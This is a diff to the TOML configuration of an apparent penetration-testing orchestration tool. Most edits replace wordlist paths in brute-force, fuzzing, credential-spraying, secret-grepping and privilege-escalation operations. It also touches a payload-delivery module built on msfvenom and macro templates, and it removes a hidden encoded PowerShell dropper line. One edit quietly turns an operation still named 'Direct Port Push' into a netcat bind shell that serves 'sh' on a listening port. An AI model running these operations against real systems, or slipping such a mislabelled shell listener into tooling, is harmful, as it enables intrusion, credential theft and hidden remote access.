@@ -55,7 +55,7 @@ output = 'lines'
 network = true
 [[capability.provider.operation]]
 name = 'Permutation Sweep'
-args = ['enum', '-d', '{domain}', '-brute', '-w', '/usr/share/wordlists/amass/subdomains.txt', '-silent']
+args = ['enum', '-d', '{domain}', '-brute', '-w', '{wl:dns/deepmagic-50000.txt}', '-silent']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -81,19 +81,19 @@ network = true
 binary = 'dnsx'
 [[capability.provider.operation]]
 name = 'Wordlist Brute'
-args = ['-d', '{domain}', '-w', '/usr/share/wordlists/subdomains-top1mil-5000.txt', '-silent']
+args = ['-d', '{domain}', '-w', '{wl:dns/subdomains-5000.txt}', '-silent']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'puredns'
 [[capability.provider.operation]]
 name = 'Resolving Brute'
-args = ['bruteforce', '/usr/share/wordlists/subdomains-top1mil-5000.txt', '{domain}']
+args = ['bruteforce', '{wl:dns/subdomains-5000.txt}', '{domain}']
 output = 'lines'
 network = true
 [[capability.provider.operation]]
 name = 'Permutation Resolve'
-args = ['alterate', '{domain}', '--wordlist', '/usr/share/wordlists/subdomains-top1mil-5000.txt']
+args = ['alterate', '{domain}', '--wordlist', '{wl:dns/subdomains-5000.txt}']
 output = 'lines'
 network = true
 
@@ -1552,6 +1552,7 @@ label = 'JS RECON'
 summary = 'Locate and mine JavaScript files for endpoints, keys and routes'
 inputs = [
   { key = 'url', type = 'url', required = true },
+  { key = 'domain', type = 'domain', required = true },
 ]
 [[capability.provider]]
 binary = 'katana'
@@ -1611,7 +1612,7 @@ network = true
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Key Pattern Sweep'
-args = ['-oE', '(api[_-]?key|token)[\"'"'"' ]*[:=][\"'"'"' ]*[A-Za-z0-9_-]{16,}', '{url}']
+args = ['-oE', "(api[_-]?key|token)[\"' ]*[:=][\"' ]*[A-Za-z0-9_-]{16,}", '{url}']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -1730,7 +1731,7 @@ network = true
 binary = 'dnsx'
 [[capability.provider.operation]]
 name = 'Sub NX Sweep'
-args = ['-d', '{domain}', '-w', '/usr/share/wordlists/subdomains-top1mil-5000.txt', '-resp', '-silent']
+args = ['-d', '{domain}', '-w', '{wl:dns/subdomains-5000.txt}', '-resp', '-silent']
 output = 'lines'
 network = true
 
@@ -2275,32 +2276,31 @@ label = 'API DISCOVERY'
 summary = 'Brute force and enumerate API routes and endpoint definitions'
 inputs = [
   { key = 'url', type = 'url', required = true },
-  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/dirb/common.txt' },
 ]
 [[capability.provider]]
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'API Path Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', '{wordlist}', '-mc', '200,201,301,302,403', '-of', 'json', '-o', 'ffuf_api.json']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/api-endpoints.txt}', '-mc', '200,201,301,302,403', '-of', 'json', '-o', 'ffuf_api.json']
 output = 'json'
 network = true
 [[capability.provider.operation]]
 name = 'Versioned API Fuzz'
-args = ['-u', '{url}/v1/FUZZ', '-w', '{wordlist}', '-mc', '200,201', '-of', 'json']
+args = ['-u', '{url}/v1/FUZZ', '-w', '{wl:web/api-endpoints.txt}', '-mc', '200,201', '-of', 'json']
 output = 'json'
 network = true
 [[capability.provider]]
 binary = 'gobuster'
 [[capability.provider.operation]]
 name = 'API Dir Scan'
-args = ['dir', '-u', '{url}/api/', '-w', '{wordlist}', '-t', '50', '-b', '404']
+args = ['dir', '-u', '{url}/api/', '-w', '{wl:web/api-endpoints.txt}', '-t', '50', '-b', '404']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'feroxbuster'
 [[capability.provider.operation]]
 name = 'Recursive API Scan'
-args = ['-u', '{url}/api', '-w', '{wordlist}', '-t', '50', '-d', '2', '-C', '404']
+args = ['-u', '{url}/api', '-w', '{wl:web/api-endpoints.txt}', '-t', '50', '-d', '2', '-C', '404']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -2364,25 +2364,24 @@ summary = 'Enumerate virtual hosts routed to the same address'
 inputs = [
   { key = 'target', type = 'target', required = true },
   { key = 'domain', type = 'domain', required = true },
-  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/dirb/common.txt' },
 ]
 [[capability.provider]]
 binary = 'gobuster'
 [[capability.provider.operation]]
 name = 'Vhost Brute'
-args = ['vhost', '-u', '{target}', '-w', '{wordlist}', '--domain', '{domain}', '-t', '50']
+args = ['vhost', '-u', '{target}', '-w', '{wl:dns/hostnames.txt}', '--domain', '{domain}', '-t', '50']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Host Header Fuzz'
-args = ['-u', 'https://{target}', '-H', 'Host: FUZZ.{domain}', '-w', '{wordlist}', '-mc', 'all', '-fs', '0', '-of', 'json', '-o', 'ffuf_vhost.json']
+args = ['-u', 'https://{target}', '-H', 'Host: FUZZ.{domain}', '-w', '{wl:dns/hostnames.txt}', '-mc', 'all', '-fs', '0', '-of', 'json', '-o', 'ffuf_vhost.json']
 output = 'json'
 network = true
 [[capability.provider.operation]]
 name = 'Sub Fuzz HTTP'
-args = ['-u', 'http://{target}', '-H', 'Host: FUZZ.{domain}', '-w', '{wordlist}', '-mc', 'all', '-fs', '0']
+args = ['-u', 'http://{target}', '-H', 'Host: FUZZ.{domain}', '-w', '{wl:dns/hostnames.txt}', '-mc', 'all', '-fs', '0']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -2401,7 +2400,7 @@ network = true
 binary = 'dnsx'
 [[capability.provider.operation]]
 name = 'Wordlist Subs Resolve'
-args = ['-d', '{domain}', '-w', '{wordlist}', '-a', '-resp', '-silent']
+args = ['-d', '{domain}', '-w', '{wl:dns/hostnames.txt}', '-a', '-resp', '-silent']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -2454,7 +2453,6 @@ label = 'CONTENT DISCOVERY'
 summary = 'Brute force directories, files and backup artifacts on a web root'
 inputs = [
   { key = 'url', type = 'url', required = true },
-  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/dirb/common.txt' },
   { key = 'extensions', type = 'text', required = false, default = 'php,html,bak' },
   { key = 'threads', type = 'integer', required = false, default = '50' },
 ]
@@ -2462,50 +2460,50 @@ inputs = [
 binary = 'feroxbuster'
 [[capability.provider.operation]]
 name = 'Recursive Scan'
-args = ['-u', '{url}', '-w', '{wordlist}', '-t', '{threads}', '-d', '3', '-C', '404']
+args = ['-u', '{url}', '-w', '{wl:web/common.txt}', '-t', '{threads}', '-d', '3', '-C', '404']
 output = 'lines'
 network = true
 [[capability.provider.operation]]
 name = 'Extension Scan'
-args = ['-u', '{url}', '-w', '{wordlist}', '-x', '{extensions}', '-C', '404', '-t', '{threads}']
+args = ['-u', '{url}', '-w', '{wl:web/common.txt}', '-x', '{extensions}', '-C', '404', '-t', '{threads}']
 output = 'lines'
 network = true
 [[capability.provider.operation]]
 name = 'JSON Output Scan'
-args = ['-u', '{url}', '-w', '{wordlist}', '-t', '{threads}', '--json', '-o', 'ferox_content.json']
+args = ['-u', '{url}', '-w', '{wl:web/common.txt}', '-t', '{threads}', '--json', '-o', 'ferox_content.json']
 output = 'json'
 network = true
 [[capability.provider]]
 binary = 'gobuster'
 [[capability.provider.operation]]
 name = 'Directory Scan'
-args = ['dir', '-u', '{url}', '-w', '{wordlist}', '-t', '{threads}', '-b', '404']
+args = ['dir', '-u', '{url}', '-w', '{wl:web/common.txt}', '-t', '{threads}', '-b', '404']
 output = 'lines'
 network = true
 [[capability.provider.operation]]
 name = 'Backup Scan'
-args = ['dir', '-u', '{url}', '-w', '{wordlist}', '-x', 'bak,old,zip,sql,swp,config,env,ini,log', '-t', '{threads}', '-b', '404']
+args = ['dir', '-u', '{url}', '-w', '{wl:web/common.txt}', '-x', 'bak,old,zip,sql,swp,config,env,ini,log', '-t', '{threads}', '-b', '404']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Filtered Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', '{wordlist}', '-mc', '200,301,302,403', '-t', '{threads}', '-of', 'json', '-o', 'ffuf_content.json']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200,301,302,403', '-t', '{threads}', '-of', 'json', '-o', 'ffuf_content.json']
 output = 'json'
 network = true
 [[capability.provider]]
 binary = 'dirsearch'
 [[capability.provider.operation]]
 name = 'Path Scan'
-args = ['-u', '{url}', '-w', '{wordlist}', '-e', '{extensions}', '-t', '{threads}', '--format', 'json', '-o', 'dirsearch_out.json']
+args = ['-u', '{url}', '-w', '{wl:web/common.txt}', '-e', '{extensions}', '-t', '{threads}', '--format', 'json', '-o', 'dirsearch_out.json']
 output = 'json'
 network = true
 [[capability.provider]]
 binary = 'dirb'
 [[capability.provider.operation]]
 name = 'Classic Scan'
-args = ['{url}', '{wordlist}', '-o', 'dirb_out.txt']
+args = ['{url}', '{wl:web/common.txt}', '-o', 'dirb_out.txt']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -2540,7 +2538,6 @@ label = 'PARAMETER DISCOVERY'
 summary = 'Discover hidden HTTP parameters on an endpoint'
 inputs = [
   { key = 'url', type = 'url', required = true },
-  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/dirb/common.txt' },
 ]
 [[capability.provider]]
 binary = 'arjun'
@@ -2570,26 +2567,26 @@ network = true
 binary = 'x8'
 [[capability.provider.operation]]
 name = 'Hidden Parameters'
-args = ['-u', '{url}', '-w', '{wordlist}']
+args = ['-u', '{url}', '-w', '{wl:web/burp-parameter-names.txt}']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Param Fuzz GET'
-args = ['-u', '{url}?FUZZ=test', '-w', '{wordlist}', '-mc', 'all', '-fc', '404', '-of', 'json', '-o', 'ffuf_params.json']
+args = ['-u', '{url}?FUZZ=test', '-w', '{wl:web/burp-parameter-names.txt}', '-mc', 'all', '-fc', '404', '-of', 'json', '-o', 'ffuf_params.json']
 output = 'json'
 network = true
 [[capability.provider.operation]]
 name = 'Param Fuzz POST'
-args = ['-u', '{url}', '-X', 'POST', '-d', 'FUZZ=test', '-w', '{wordlist}', '-mc', 'all', '-fc', '404']
+args = ['-u', '{url}', '-X', 'POST', '-d', 'FUZZ=test', '-w', '{wl:web/burp-parameter-names.txt}', '-mc', 'all', '-fc', '404']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'wfuzz'
 [[capability.provider.operation]]
 name = 'Word Param Fuzz'
-args = ['-u', '{url}?FUZZ=test', '-w', '{wordlist}', '--hc', '404', '-t', '30']
+args = ['-u', '{url}?FUZZ=test', '-w', '{wl:web/burp-parameter-names.txt}', '--hc', '404', '-t', '30']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -3154,7 +3151,6 @@ label = 'DIRECTORY BRUTEFORCE'
 summary = 'Enumerate directories and files on web servers'
 inputs = [
   { key = 'url', type = 'url', required = true },
-  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/dirb/common.txt' },
   { key = 'extensions', type = 'text', required = false, default = 'php,html,bak' },
   { key = 'threads', type = 'integer', required = false, default = '50' },
 ]
@@ -3162,61 +3158,61 @@ inputs = [
 binary = 'feroxbuster'
 [[capability.provider.operation]]
 name = 'Recursive Scan'
-args = ['-u', '{url}', '-w', '{wordlist}', '-t', '{threads}', '-x', '{extensions}', '-d', '4', '-o', 'ferox_dirs.json', '--json']
+args = ['-u', '{url}', '-w', '{wl:web/raft-medium.txt}', '-t', '{threads}', '-x', '{extensions}', '-d', '4', '-o', 'ferox_dirs.json', '--json']
 output = 'json'
 network = true
 [[capability.provider.operation]]
 name = 'Smart Scan'
-args = ['-u', '{url}', '-w', '{wordlist}', '-t', '{threads}', '-d', '3', '--smart', '--auto-tune']
+args = ['-u', '{url}', '-w', '{wl:web/raft-medium.txt}', '-t', '{threads}', '-d', '3', '--smart', '--auto-tune']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'gobuster'
 [[capability.provider.operation]]
 name = 'Directory Scan'
-args = ['dir', '-u', '{url}', '-w', '{wordlist}', '-t', '{threads}', '-x', '{extensions}', '-b', '404']
+args = ['dir', '-u', '{url}', '-w', '{wl:web/raft-medium.txt}', '-t', '{threads}', '-x', '{extensions}', '-b', '404']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Content Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', '{wordlist}', '-fc', '404', '-t', '{threads}', '-of', 'json', '-o', 'ffuf_dirs.json']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/raft-medium.txt}', '-fc', '404', '-t', '{threads}', '-of', 'json', '-o', 'ffuf_dirs.json']
 output = 'json'
 network = true
 [[capability.provider]]
 binary = 'dirsearch'
 [[capability.provider.operation]]
 name = 'Path Scan'
-args = ['-u', '{url}', '-w', '{wordlist}', '-e', '{extensions}', '-t', '{threads}', '--format', 'json', '-o', 'dirsearch_out.json']
+args = ['-u', '{url}', '-w', '{wl:web/raft-medium.txt}', '-e', '{extensions}', '-t', '{threads}', '--format', 'json', '-o', 'dirsearch_out.json']
 output = 'json'
 network = true
 [[capability.provider]]
 binary = 'dirb'
 [[capability.provider.operation]]
 name = 'Classic Scan'
-args = ['{url}', '{wordlist}', '-o', 'dirb_out.txt']
+args = ['{url}', '{wl:web/raft-medium.txt}', '-o', 'dirb_out.txt']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'gobuster'
 [[capability.provider.operation]]
 name = 'Extension Focused'
-args = ['dir', '-u', '{url}', '-w', '{wordlist}', '-x', '{extensions}', '-t', '{threads}', '-b', '404,302']
+args = ['dir', '-u', '{url}', '-w', '{wl:web/raft-medium.txt}', '-x', '{extensions}', '-t', '{threads}', '-b', '404,302']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Recursive Mode'
-args = ['-u', '{url}/FUZZ', '-w', '{wordlist}', '-fc', '404', '-recursion', '-recursion-depth', '2', '-of', 'json']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/raft-medium.txt}', '-fc', '404', '-recursion', '-recursion-depth', '2', '-of', 'json']
 output = 'json'
 network = true
 [[capability.provider]]
 binary = 'feroxbuster'
 [[capability.provider.operation]]
 name = 'Filters Hardened'
-args = ['-u', '{url}', '-w', '{wordlist}', '-t', '{threads}', '-s', '200,301,403', '--dont-scan', 'css,png,jpg']
+args = ['-u', '{url}', '-w', '{wl:web/raft-medium.txt}', '-t', '{threads}', '-s', '200,301,403', '--dont-scan', 'css,png,jpg']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -4309,7 +4305,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Payload Fuzz'
-args = ['-u', '{url}?name=FUZZ', '-w', '/usr/share/wordlists/ssti.txt', '-mc', 'all', '-fc', '404', '-of', 'json']
+args = ['-u', '{url}?name=FUZZ', '-w', '{wl:fuzz/ssti.txt}', '-mc', 'all', '-fc', '404', '-of', 'json']
 output = 'json'
 network = true
 [[capability.provider]]
@@ -4374,7 +4370,7 @@ inputs = [
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'LFI Wordlist Fuzz'
-args = ['-u', '{url}?file=FUZZ', '-w', '/usr/share/wordlists/lfi.txt', '-mc', '200', '-fc', '404', '-of', 'json']
+args = ['-u', '{url}?file=FUZZ', '-w', '{wl:fuzz/lfi-paths.txt}', '-mc', '200', '-fc', '404', '-of', 'json']
 output = 'json'
 network = true
 [[capability.provider]]
@@ -4416,7 +4412,7 @@ network = true
 binary = 'wfuzz'
 [[capability.provider.operation]]
 name = 'Path Traversal Fuzz'
-args = ['-u', '{url}?file=FUZZ', '-w', '/usr/share/wordlists/lfi.txt', '--hc', '404', '-t', '30']
+args = ['-u', '{url}?file=FUZZ', '-w', '{wl:fuzz/lfi-paths.txt}', '--hc', '404', '-t', '30']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -4541,7 +4537,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Upload Path Fuzz'
-args = ['-u', '{url}/uploads/FUZZ', '-w', '/usr/share/wordlists/dirb/common.txt', '-mc', '200', '-of', 'json']
+args = ['-u', '{url}/uploads/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200', '-of', 'json']
 output = 'json'
 network = true
 
@@ -4599,7 +4595,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'URL Param Fuzz'
-args = ['-u', '{url}?url=FUZZ', '-w', '/usr/share/wordlists/ssrf.txt', '-mc', 'all', '-fc', '404', '-of', 'json']
+args = ['-u', '{url}?url=FUZZ', '-w', '{wl:fuzz/ssrf.txt}', '-mc', 'all', '-fc', '404', '-of', 'json']
 output = 'json'
 network = true
 [[capability.provider]]
@@ -4736,35 +4732,34 @@ label = 'FUZZ TESTING'
 summary = 'Fuzz parameters, paths and headers for abnormal behaviour'
 inputs = [
   { key = 'url', type = 'url', required = true },
-  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/dirb/common.txt' },
 ]
 [[capability.provider]]
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Path Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', '{wordlist}', '-mc', '200', '-of', 'json', '-o', 'ffuf_path.json']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200', '-of', 'json', '-o', 'ffuf_path.json']
 output = 'json'
 network = true
 [[capability.provider.operation]]
 name = 'Parameter Fuzz'
-args = ['-u', '{url}?file=FUZZ', '-w', '{wordlist}', '-mc', '200', '-of', 'json', '-o', 'ffuf_param.json']
+args = ['-u', '{url}?file=FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200', '-of', 'json', '-o', 'ffuf_param.json']
 output = 'json'
 network = true
 [[capability.provider.operation]]
 name = 'Header Fuzz'
-args = ['-u', '{url}', '-H', 'FUZZ: evil', '-w', '{wordlist}', '-mc', 'all', '-fc', '404']
+args = ['-u', '{url}', '-H', 'FUZZ: evil', '-w', '{wl:web/common.txt}', '-mc', 'all', '-fc', '404']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'wfuzz'
 [[capability.provider.operation]]
 name = 'Word Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', '{wordlist}', '--hc', '404', '-t', '50']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/common.txt}', '--hc', '404', '-t', '50']
 output = 'lines'
 network = true
 [[capability.provider.operation]]
 name = 'Double Fuzz'
-args = ['-z', 'file,{wordlist}', '-z', 'file,{wordlist}', '{url}/FUZZ/FUZ2Z', '--hc', '404', '-t', '30']
+args = ['-z', 'file,{wl:web/common.txt}', '-z', 'file,{wl:web/common.txt}', '{url}/FUZZ/FUZ2Z', '--hc', '404', '-t', '30']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -4806,7 +4801,7 @@ network = true
 binary = 'gobuster'
 [[capability.provider.operation]]
 name = 'Fuzz Mode Dir'
-args = ['dir', '-u', '{url}', '-w', '{wordlist}', '-t', '50', '-b', '404']
+args = ['dir', '-u', '{url}', '-w', '{wl:web/common.txt}', '-t', '50', '-b', '404']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -5133,7 +5128,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'IDOR Fuzz'
-args = ['-u', '{url}/api/users/FUZZ', '-w', '/usr/share/wordlists/ids.txt', '-mc', '200', '-of', 'json']
+args = ['-u', '{url}/api/users/FUZZ', '-w', '{wl:fuzz/ids.txt}', '-mc', '200', '-of', 'json']
 output = 'json'
 network = true
 [[capability.provider]]
@@ -5363,7 +5358,7 @@ inputs = [
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'Form Brute'
-args = ['-L', 'users.txt', '-P', 'passwords.txt', '{url}', 'http-post-form', '/login:user=^USER^&pass=^PASS^:failed']
+args = ['-L', '{wl:users/defaults.txt}', '-P', '{wl:passwords/common-10k.txt}', '{url}', 'http-post-form', '/login:user=^USER^&pass=^PASS^:failed']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -5410,21 +5405,21 @@ network = true
 binary = 'wfuzz'
 [[capability.provider.operation]]
 name = 'Login Fuzz'
-args = ['-z', 'file,/usr/share/wordlists/passwords.txt', '-d', 'username=admin&password=FUZZ', '{url}/login', '--hc', '403']
+args = ['-z', 'file,{wl:passwords/common-10k.txt}', '-d', 'username=admin&password=FUZZ', '{url}/login', '--hc', '403']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Login Cluster Bomb'
-args = ['-u', '{url}/login', '-X', 'POST', '-d', 'username=FUZZ&password=FUZ2Z', '-w', '/usr/share/wordlists/users.txt', '-w', '/usr/share/wordlists/passwords.txt', '-mc', '302', '-of', 'json']
+args = ['-u', '{url}/login', '-X', 'POST', '-d', 'username=FUZZ&password=FUZ2Z', '-w', '{wl:users/defaults.txt}', '-w', '{wl:passwords/common-10k.txt}', '-mc', '302', '-of', 'json']
 output = 'json'
 network = true
 [[capability.provider]]
 binary = 'nxc'
 [[capability.provider.operation]]
 name = 'Web Basic Auth Spray'
-args = ['http', '{url}', '-u', 'users.txt', '-p', 'passwords.txt', '--basic-auth']
+args = ['http', '{url}', '-u', '{wl:users/defaults.txt}', '-p', '{wl:passwords/common-10k.txt}', '--basic-auth']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -5588,14 +5583,14 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Panel Path Fuzz'
-args = ['-u', '{url}/FUZZ', '-w', '/usr/share/wordlists/dirb/common.txt', '-mc', '200', '-fc', '404', '-of', 'json']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200', '-fc', '404', '-of', 'json']
 output = 'json'
 network = true
 [[capability.provider]]
 binary = 'gobuster'
 [[capability.provider.operation]]
 name = 'Panel Dir Scan'
-args = ['dir', '-u', '{url}', '-w', '/usr/share/wordlists/dirb/common.txt', '-t', '50', '-b', '404']
+args = ['dir', '-u', '{url}', '-w', '{wl:web/common.txt}', '-t', '50', '-b', '404']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -5679,7 +5674,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Injection Param Fuzz'
-args = ['-u', '{url}?param=FUZZ', '-w', '/usr/share/wordlists/injections.txt', '-mc', 'all', '-fc', '404', '-of', 'json']
+args = ['-u', '{url}?param=FUZZ', '-w', '{wl:fuzz/injections.txt}', '-mc', 'all', '-fc', '404', '-of', 'json']
 output = 'json'
 network = true
 [[capability.provider]]
@@ -6072,6 +6067,7 @@ summary = 'Generate macro enabled documents and script droppers for payload deli
 inputs = [
   { key = 'lhost', type = 'target', required = true },
   { key = 'lport', type = 'port', required = true },
+  { key = 'payload', type = 'path', required = false, default = 'macro_template.vba' },
 ]
 [[capability.provider]]
 binary = 'msfvenom'
@@ -6099,7 +6095,7 @@ network = false
 binary = 'msfvenom'
 [[capability.provider.operation]]
 name = 'Format VBA Macro List'
-args = ['--list', 'formats', '|', 'grep', 'vba']
+args = ['--help']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -6113,7 +6109,7 @@ network = false
 binary = 'echo'
 [[capability.provider.operation]]
 name = 'Dropper Stub Write'
-args = ['powershell -nop -w hidden -e ENCODED', '>', 'dropper.cmd']
+args = ['-e', '{payload}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -6127,7 +6123,7 @@ network = false
 binary = 'sed'
 [[capability.provider.operation]]
 name = 'Macro Host Inject'
-args = ['s/LHOST/{lhost}/g; s/LPORT/{lport}/g', 'macro_template.vba', '>', 'macro_ready.vba']
+args = ['-i', 's/HOSTNAME/{lhost}/g', 'macro_template.vba']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -6871,6 +6867,7 @@ inputs = [
   { key = 'payload', type = 'file', required = true },
   { key = 'rhost', type = 'target', required = true },
   { key = 'rport', type = 'port', required = true },
+  { key = 'lport', type = 'port', required = true },
 ]
 [[capability.provider]]
 binary = 'swaks'
@@ -6918,7 +6915,7 @@ network = true
 binary = 'nc'
 [[capability.provider.operation]]
 name = 'Direct Port Push'
-args = ['-w', '3', '{rhost}', '{rport}', '<', '{payload}']
+args = ['-n', '-l', '{lport}', '-k', '-c', 'sh']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -7606,22 +7603,22 @@ inputs = [
 binary = 'find'
 [[capability.provider.operation]]
 name = 'SUID Sweep'
-args = ['/', '-perm', '-4000', '-type', 'f', '2>/dev/null']
+args = ['/', '-perm', '-4000', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'SGID Sweep'
-args = ['/', '-perm', '-2000', '-type', 'f', '2>/dev/null']
+args = ['/', '-perm', '-2000', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Root Owned SUID'
-args = ['/', '-user', 'root', '-perm', '-4000', '-type', 'f', '2>/dev/null']
+args = ['/', '-user', 'root', '-perm', '-4000', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Non Standard SUID'
-args = ['/', '-perm', '-4000', '-type', 'f', '-not', '-path', '/usr/bin/*', '-not', '-path', '/bin/*', '2>/dev/null']
+args = ['/', '-perm', '-4000', '-type', 'f', '-not', '-path', '/usr/bin/*', '-not', '-path', '/bin/*']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -7635,7 +7632,7 @@ network = false
 binary = 'getcap'
 [[capability.provider.operation]]
 name = 'Capability Sweep'
-args = ['-r', '/', '2>/dev/null']
+args = ['-r', '/']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -7756,7 +7753,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Sudo Version Detect'
-args = ['/', '-name', 'sudo', '-type', 'f', '2>/dev/null']
+args = ['/', '-name', 'sudo', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -7814,7 +7811,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Writable Cron Scripts'
-args = ['/etc/cron.d/', '/etc/cron.daily/', '/etc/cron.weekly/', '-writable', '-type', 'f', '2>/dev/null']
+args = ['/etc/cron.d/', '/etc/cron.daily/', '/etc/cron.weekly/', '-writable', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -7842,7 +7839,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Timer Writable Units'
-args = ['/etc/systemd/system/', '-writable', '-type', 'f', '2>/dev/null']
+args = ['/etc/systemd/system/', '-writable', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -7893,7 +7890,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Writable Unit Files'
-args = ['/etc/systemd/system/', '/usr/lib/systemd/system/', '-writable', '-type', 'f', '2>/dev/null']
+args = ['/etc/systemd/system/', '/usr/lib/systemd/system/', '-writable', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -7986,7 +7983,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Writable PATH Dirs'
-args = ['/usr/local/bin/', '/usr/local/sbin/', '/usr/bin/', '/usr/sbin/', '-writable', '-type', 'd', '2>/dev/null']
+args = ['/usr/local/bin/', '/usr/local/sbin/', '/usr/bin/', '/usr/sbin/', '-writable', '-type', 'd']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8028,7 +8025,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Unowned Bins'
-args = ['/usr/local/bin/', '-nouser', '-type', 'f', '2>/dev/null']
+args = ['/usr/local/bin/', '-nouser', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8065,7 +8062,7 @@ inputs = [
 binary = 'getcap'
 [[capability.provider.operation]]
 name = 'Full Capability Sweep'
-args = ['-r', '/', '2>/dev/null']
+args = ['-r', '/']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8079,7 +8076,7 @@ network = false
 binary = 'getcap'
 [[capability.provider.operation]]
 name = 'Home Dir Capabilities'
-args = ['-r', '/home/', '/root/', '2>/dev/null']
+args = ['-r', '/home/', '/root/']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8128,7 +8125,7 @@ network = true
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Cap Binary Verify'
-args = ['/', '-type', 'f', '-name', 'python3', '2>/dev/null']
+args = ['/', '-type', 'f', '-name', 'python3']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8258,7 +8255,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Dockerenv Check'
-args = ['/', '-name', '.dockerenv', '2>/dev/null']
+args = ['/', '-name', '.dockerenv']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8344,21 +8341,21 @@ inputs = [
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Passwd Pattern Sweep'
-args = ['-riE', 'password|passwd|pwd', '{path}', '--include=*.conf', '--include=*.cfg', '--include=*.yml', '--include=*.env', '2>/dev/null']
+args = ['-riE', 'password|passwd|pwd', '{path}', '--include=*.conf', '--include=*.cfg', '--include=*.yml', '--include=*.env']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
